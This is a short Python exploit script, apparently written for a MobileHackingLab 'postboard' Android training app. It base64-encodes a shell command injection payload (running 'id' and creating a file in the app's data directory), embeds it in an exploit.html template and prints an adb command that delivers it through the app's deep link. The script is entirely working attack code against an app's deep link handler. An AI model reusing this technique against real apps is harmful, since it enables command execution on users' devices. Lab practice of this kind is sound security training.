import base64

command = "id; touch /data/data/com.mobilehackinglab.postboard/files/inersin #"

amCmd = """adb shell am start -a android.intent.action.VIEW -d "postboard://postmessage/{}"
"""

message = base64.b64encode(command.encode())
data = base64.b64encode(open("exploit.html", 'rb').read().replace(b"REPLACE_ME", message)).decode()
print(amCmd.format(data))